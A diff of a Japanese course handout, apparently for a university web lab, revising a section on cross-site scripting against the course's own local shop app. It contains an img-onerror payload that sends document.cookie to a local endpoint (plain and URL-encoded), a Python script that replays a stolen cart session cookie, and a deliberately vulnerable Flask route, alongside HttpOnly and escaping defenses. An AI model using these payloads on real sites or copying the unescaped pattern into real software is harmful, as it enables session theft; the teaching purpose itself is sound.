       <img src="figs/01/xss-04.png" alt="img" />
       <figcaption aria-hidden="true">img</figcaption>
       </figure>
-      <h3 data-number="7.0.5" id="例5"><span class="header-section-number">7.0.5</span> 例5</h3>
-      <div class="sourceCode" id="cb34"
+      <p>クエリパラメータに設定されているのは「<strong>HttpOnly属性が設定されていない Cookie
+      を</strong> <code>document.cookie</code>
+      <strong>によって読み出して画面に出力するJavaScript</strong>」のコードです。危険な香りがしてきましたが、自分の
+      Cookie が、自分の見ているが画面に出力されるだけで、特に実害はありません。</p>
+      <h3 data-number="7.2.5" id="例5"><span class="header-section-number">7.2.5</span> 例5
+      💀💀💀</h3>
+      <p>次のクエリパラメータには <code>document.cookie</code> で取得した Cookie を
+      <code>http://localhost:3000/api/xss</code> に送信して、その後、<code>/</code> に移動するような
+      JavaScript プログラムが設定されています。</p>
+      <div class="sourceCode" id="cb36"
       data-caption="💀💀💀 XSS脆弱性を利用してCookieを取得して送信"><pre
-      class="sourceCode txt"><code class="sourceCode default"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;fetch(&#39;http://localhost:3000/api/xss?c=&#39;+document.cookie);window.location.href=&#39;/&#39;&quot;&gt;</span></code></pre></div>
+      class="sourceCode txt"><code class="sourceCode default"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;fetch(&#39;http://localhost:3000/api/xss?c=&#39;+document.cookie);window.location.href=&#39;/&#39;&quot;&gt;</span></code></pre></div>
+      <p>上記は、そのまま貼り付けても機能しません。<code>name=</code>
+      以降の文字をURLエンコーディングする必要があります。</p>
+      <p>以下のサイトなどを利用して
+      <code>&lt;img src=x onerror="fetch('http://localhost:3000/api/xss?c='+document.cookie);window.location.href='/'"&gt;</code>
+      の部分だけURLエンコーディングします。</p>
       <ul>
-      <li>(URLエンコーディング/パーセントエンコーディング)[https://tech-unlimited.com/urlencode.html]</li>
+      <li><a
+      href="https://tech-unlimited.com/urlencode.html">URLエンコーディング/パーセントエンコーディング</a></li>
       </ul>
-      <div class="sourceCode" id="cb35"
+      <p>以下のような URL が得られます。</p>
+      <div class="sourceCode" id="cb37"
       data-caption="💀💀💀 XSS脆弱性を利用してCookieを取得して送信 (URLエンコード後)"><pre
-      class="sourceCode txt"><code class="sourceCode default"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=%3Cimg+src%3Dx+onerror%3D%22fetch%28%27http%3A%2F%2Flocalhost%3A3000%2Fapi%2Fxss%3Fc%3D%27%2Bdocument.cookie%29%3Bwindow.location.href%3D%27%2F%27%22%3E</span></code></pre></div>
+      class="sourceCode txt"><code class="sourceCode default"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=%3Cimg+src%3Dx+onerror%3D%22fetch%28%27http%3A%2F%2Flocalhost%3A3000%2Fapi%2Fxss%3Fc%3D%27%2Bdocument.cookie%29%3Bwindow.location.href%3D%27%2F%27%22%3E</span></code></pre></div>
+      <p>これを貼り付けて実行すると、自分の Cookie が <code>http://localhost:3000/api/xss</code>
+      宛に送信されます😇。ここでは実験のために、自分のウェブアプリのウェブAPIに情報を送っていますが、実際の攻撃時には、攻撃者😈の用意した
+      URL となります。</p>
+      <p>プロジェクトフォルダのなかの <code>src/app/api/xss/route.ts</code>
+      を読解してもらうと分かるとおもいますが、<code>http://localhost:3000/api/xss?c=HogeFugaPiyo</code>
+      のようにクエリパラメータをつけてアクセスすると、<code>c=</code> の部分、つまり
+      <code>HogeFugaPiyo</code> を DB の <code>stolenContent</code>
+      に保存する仕組みになっています。</p>
+      <p>実際に被害を確認してみましょう。次のコマンドで DB の内容を確認します。</p>
       <pre><code>npx prisma studio</code></pre>
-      <h2 data-number="7.1" id="cookie-が窃取されると"><span
-      class="header-section-number">7.1</span> Cookie が窃取されると…</h2>
+      <p>次のように、見事に自分の Cookie が攻撃者の DB の <code>tolenContent</code>
+      テーブルに記録されてしまいました😇</p>
       <figure>
       <img src="figs/01/xss-05.png" alt="img" />
       <figcaption aria-hidden="true">img</figcaption>
       </figure>
-      <div class="sourceCode" id="cb37" data-caption="💀💀💀💀 入手したCookieを悪用 (Python)"><pre
-      class="sourceCode python"><code class="sourceCode python"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
-<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> json</span>
-<span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb37-4"><a href="#cb37-4" aria-hidden="true" tabindex="-1"></a>url <span class="op">=</span> <span class="st">&#39;http://localhost:3000/api/cart&#39;</span></span>
-<span id="cb37-5"><a href="#cb37-5" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb37-6"><a href="#cb37-6" aria-hidden="true" tabindex="-1"></a><span class="co"># ここに窃取したセッションIDをセット</span></span>
-<span id="cb37-7"><a href="#cb37-7" aria-hidden="true" tabindex="-1"></a>cart_session_id <span class="op">=</span> <span class="st">&#39;00000000-0000-0000-0000-000000000000&#39;</span></span>
-<span id="cb37-8"><a href="#cb37-8" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb37-9"><a href="#cb37-9" aria-hidden="true" tabindex="-1"></a>cookies <span class="op">=</span> {<span class="st">&#39;cart_session_id&#39;</span>: cart_session_id}</span>
-<span id="cb37-10"><a href="#cb37-10" aria-hidden="true" tabindex="-1"></a>headers <span class="op">=</span> {<span class="st">&#39;Content-Type&#39;</span>: <span class="st">&#39;application/json&#39;</span>}</span>
-<span id="cb37-11"><a href="#cb37-11" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> {<span class="st">&#39;productId&#39;</span>: <span class="st">&#39;A-002&#39;</span>, <span class="st">&#39;quantity&#39;</span>: <span class="dv">9999</span>}</span>
-<span id="cb37-12"><a href="#cb37-12" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb37-13"><a href="#cb37-13" aria-hidden="true" tabindex="-1"></a>res <span class="op">=</span> requests.patch(</span>
-<span id="cb37-14"><a href="#cb37-14" aria-hidden="true" tabindex="-1"></a>  url<span class="op">=</span>url,</span>
-<span id="cb37-15"><a href="#cb37-15" aria-hidden="true" tabindex="-1"></a>  data<span class="op">=</span>json.dumps(payload),</span>
-<span id="cb37-16"><a href="#cb37-16" aria-hidden="true" tabindex="-1"></a>  headers<span class="op">=</span>headers,</span>
-<span id="cb37-17"><a href="#cb37-17" aria-hidden="true" tabindex="-1"></a>  cookies<span class="op">=</span>cookies</span>
-<span id="cb37-18"><a href="#cb37-18" aria-hidden="true" tabindex="-1"></a>)</span>
-<span id="cb37-19"><a href="#cb37-19" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb37-20"><a href="#cb37-20" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&#39;ステータスコード: </span><span class="sc">{</span>res<span class="sc">.</span>status_code<span class="sc">}</span><span class="ss">&#39;</span>)</span>
-<span id="cb37-21"><a href="#cb37-21" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb37-22"><a href="#cb37-22" aria-hidden="true" tabindex="-1"></a>is_success <span class="op">=</span> res.json().get(<span class="st">&#39;success&#39;</span>)</span>
-<span id="cb37-23"><a href="#cb37-23" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&#39;res.success: </span><span class="sc">{</span>is_success<span class="sc">}</span><span class="ss">&#39;</span>)</span>
-<span id="cb37-24"><a href="#cb37-24" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb37-25"><a href="#cb37-25" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> is_success:</span>
-<span id="cb37-26"><a href="#cb37-26" aria-hidden="true" tabindex="-1"></a>  res <span class="op">=</span> requests.get(</span>
-<span id="cb37-27"><a href="#cb37-27" aria-hidden="true" tabindex="-1"></a>    url<span class="op">=</span>url,</span>
-<span id="cb37-28"><a href="#cb37-28" aria-hidden="true" tabindex="-1"></a>    cookies<span class="op">=</span>cookies</span>
-<span id="cb37-29"><a href="#cb37-29" aria-hidden="true" tabindex="-1"></a>  )</span>
-<span id="cb37-30"><a href="#cb37-30" aria-hidden="true" tabindex="-1"></a>  cart_items <span class="op">=</span> res.json().get(<span class="st">&#39;payload&#39;</span>)</span>
-<span id="cb37-31"><a href="#cb37-31" aria-hidden="true" tabindex="-1"></a>  <span class="bu">print</span>(<span class="ss">f&#39;カートの内容: </span><span class="sc">{</span>json<span class="sc">.</span>dumps(cart_items, indent<span class="op">=</span><span class="dv">2</span>)<span class="sc">}</span><span class="ss">&#39;</span>)</span></code></pre></div>
-      <h2 data-number="7.2" id="flask-python-などでもxss脆弱性に注意"><span
-      class="header-section-number">7.2</span> Flask (Python) などでもXSS脆弱性に注意</h2>
-      <div class="sourceCode" id="cb38" data-caption="XSS脆弱性 (Python)"><pre
-      class="sourceCode python"><code class="sourceCode python"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> flask <span class="im">import</span> Flask, request, Response</span>
-<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a>app <span class="op">=</span> Flask(<span class="va">__name__</span>)</span>
-<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a><span class="at">@app.route</span>(<span class="st">&quot;/&quot;</span>)</span>
-<span id="cb38-6"><a href="#cb38-6" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> greet():</span>
-<span id="cb38-7"><a href="#cb38-7" aria-hidden="true" tabindex="-1"></a>  name <span class="op">=</span> request.args.get(<span class="st">&quot;name&quot;</span>, <span class="st">&quot;&quot;</span>)</span>
-<span id="cb38-8"><a href="#cb38-8" aria-hidden="true" tabindex="-1"></a>  html <span class="op">=</span> <span class="ss">f&quot;こんにちは</span><span class="sc">{</span>name<span class="sc">}</span><span class="ss">さん&quot;</span></span>
-<span id="cb38-9"><a href="#cb38-9" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> Response(html, content_type<span class="op">=</span><span class="st">&quot;text/html&quot;</span>)</span>
-<span id="cb38-10"><a href="#cb38-10" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb38-11"><a href="#cb38-11" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&quot;__main__&quot;</span>:</span>
-<span id="cb38-12"><a href="#cb38-12" aria-hidden="true" tabindex="-1"></a>  app.run(debug<span class="op">=</span><span class="va">True</span>)</span></code></pre></div>
+      <p>ここで <code>cart_session_id</code> が窃取されたことは極めて問題です。窃取した
+      <code>cart_session_id</code> を Cookie
+      にセットすれば、攻撃者が自由にカートの内容を操作できるためです。</p>
+      <p>以下は、Python プログラムですが窃取した Cookie を使ってカートに商品IDが <code>A-002</code>
+      のアイテム (＝月収7桁を叩き出すCSS講座【完全無料】) を 9999 個突っ込むものになっています。</p>
+      <div class="sourceCode" id="cb39" data-caption="💀💀💀💀 入手したCookieを悪用 (Python)"><pre
+      class="sourceCode python"><code class="sourceCode python"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
+<span id="cb39-2"><a href="#cb39-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> json</span>
+<span id="cb39-3"><a href="#cb39-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb39-4"><a href="#cb39-4" aria-hidden="true" tabindex="-1"></a>url <span class="op">=</span> <span class="st">&#39;http://localhost:3000/api/cart&#39;</span></span>
+<span id="cb39-5"><a href="#cb39-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb39-6"><a href="#cb39-6" aria-hidden="true" tabindex="-1"></a><span class="co"># ここに窃取したセッションIDをセット</span></span>
+<span id="cb39-7"><a href="#cb39-7" aria-hidden="true" tabindex="-1"></a>cart_session_id <span class="op">=</span> <span class="st">&#39;00000000-0000-0000-0000-000000000000&#39;</span></span>
+<span id="cb39-8"><a href="#cb39-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb39-9"><a href="#cb39-9" aria-hidden="true" tabindex="-1"></a>cookies <span class="op">=</span> {<span class="st">&#39;cart_session_id&#39;</span>: cart_session_id}</span>
+<span id="cb39-10"><a href="#cb39-10" aria-hidden="true" tabindex="-1"></a>headers <span class="op">=</span> {<span class="st">&#39;Content-Type&#39;</span>: <span class="st">&#39;application/json&#39;</span>}</span>
+<span id="cb39-11"><a href="#cb39-11" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> {<span class="st">&#39;productId&#39;</span>: <span class="st">&#39;A-002&#39;</span>, <span class="st">&#39;quantity&#39;</span>: <span class="dv">9999</span>}</span>
+<span id="cb39-12"><a href="#cb39-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb39-13"><a href="#cb39-13" aria-hidden="true" tabindex="-1"></a>res <span class="op">=</span> requests.patch(</span>
+<span id="cb39-14"><a href="#cb39-14" aria-hidden="true" tabindex="-1"></a>  url<span class="op">=</span>url,</span>
+<span id="cb39-15"><a href="#cb39-15" aria-hidden="true" tabindex="-1"></a>  data<span class="op">=</span>json.dumps(payload),</span>
+<span id="cb39-16"><a href="#cb39-16" aria-hidden="true" tabindex="-1"></a>  headers<span class="op">=</span>headers,</span>
+<span id="cb39-17"><a href="#cb39-17" aria-hidden="true" tabindex="-1"></a>  cookies<span class="op">=</span>cookies</span>
+<span id="cb39-18"><a href="#cb39-18" aria-hidden="true" tabindex="-1"></a>)</span>
+<span id="cb39-19"><a href="#cb39-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb39-20"><a href="#cb39-20" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&#39;ステータスコード: </span><span class="sc">{</span>res<span class="sc">.</span>status_code<span class="sc">}</span><span class="ss">&#39;</span>)</span>
+<span id="cb39-21"><a href="#cb39-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb39-22"><a href="#cb39-22" aria-hidden="true" tabindex="-1"></a>is_success <span class="op">=</span> res.json().get(<span class="st">&#39;success&#39;</span>)</span>
+<span id="cb39-23"><a href="#cb39-23" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&#39;res.success: </span><span class="sc">{</span>is_success<span class="sc">}</span><span class="ss">&#39;</span>)</span>
+<span id="cb39-24"><a href="#cb39-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb39-25"><a href="#cb39-25" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> is_success:</span>
+<span id="cb39-26"><a href="#cb39-26" aria-hidden="true" tabindex="-1"></a>  res <span class="op">=</span> requests.get(</span>
+<span id="cb39-27"><a href="#cb39-27" aria-hidden="true" tabindex="-1"></a>    url<span class="op">=</span>url,</span>
+<span id="cb39-28"><a href="#cb39-28" aria-hidden="true" tabindex="-1"></a>    cookies<span class="op">=</span>cookies</span>
+<span id="cb39-29"><a href="#cb39-29" aria-hidden="true" tabindex="-1"></a>  )</span>
+<span id="cb39-30"><a href="#cb39-30" aria-hidden="true" tabindex="-1"></a>  cart_items <span class="op">=</span> res.json().get(<span class="st">&#39;payload&#39;</span>)</span>
+<span id="cb39-31"><a href="#cb39-31" aria-hidden="true" tabindex="-1"></a>  <span class="bu">print</span>(<span class="ss">f&#39;カートの内容: </span><span class="sc">{</span>json<span class="sc">.</span>dumps(cart_items, indent<span class="op">=</span><span class="dv">2</span>)<span class="sc">}</span><span class="ss">&#39;</span>)</span></code></pre></div>
+      <p>以上で、Cookie
+      に適切な属性を設定することの重要性、適切なサニタイズやエスケープ処理をすることの重要性が理解できたと思います。</p>
+      <p>Cookie
+      に「HttpOnly属性」をつけていれば…もしくはサニタイズもしくはエスケープ処理をしていれば…防ぐことができた被害でした。</p>
+      <h2 data-number="7.3" id="flask-python-などでもxss脆弱性に注意"><span
+      class="header-section-number">7.3</span> Flask (Python) などでもXSS脆弱性に注意</h2>
+      <p>Next.js は、基本的にはXSS攻撃が成功しにくい設計になっています。あえて
+      <code>dangerouslySetInnerHTML</code> 属性をしなければ問題ありません。</p>
+      <p>一方で、Flask (前期実験のもう一方のテーマで使用)
+      などは、標準でXSS攻撃が成功しやすい設計になっています。十分に注意してください。</p>
+      <div class="sourceCode" id="cb40" data-caption="XSS脆弱性 (Python)"><pre
+      class="sourceCode python"><code class="sourceCode python"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> flask <span class="im">import</span> Flask, request, Response</span>
+<span id="cb40-2"><a href="#cb40-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb40-3"><a href="#cb40-3" aria-hidden="true" tabindex="-1"></a>app <span class="op">=</span> Flask(<span class="va">__name__</span>)</span>
+<span id="cb40-4"><a href="#cb40-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb40-5"><a href="#cb40-5" aria-hidden="true" tabindex="-1"></a><span class="at">@app.route</span>(<span class="st">&quot;/&quot;</span>)</span>
+<span id="cb40-6"><a href="#cb40-6" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> greet():</span>
+<span id="cb40-7"><a href="#cb40-7" aria-hidden="true" tabindex="-1"></a>  name <span class="op">=</span> request.args.get(<span class="st">&quot;name&quot;</span>, <span class="st">&quot;&quot;</span>)</span>
+<span id="cb40-8"><a href="#cb40-8" aria-hidden="true" tabindex="-1"></a>  html <span class="op">=</span> <span class="ss">f&quot;こんにちは</span><span class="sc">{</span>name<span class="sc">}</span><span class="ss">さん&quot;</span></span>
+<span id="cb40-9"><a href="#cb40-9" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> Response(html, content_type<span class="op">=</span><span class="st">&quot;text/html&quot;</span>)</span>
+<span id="cb40-10"><a href="#cb40-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb40-11"><a href="#cb40-11" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&quot;__main__&quot;</span>:</span>
+<span id="cb40-12"><a href="#cb40-12" aria-hidden="true" tabindex="-1"></a>  app.run(debug<span class="op">=</span><span class="va">True</span>)</span></code></pre></div>
       <!-- ---------------------------------------- -->
     </main>
 
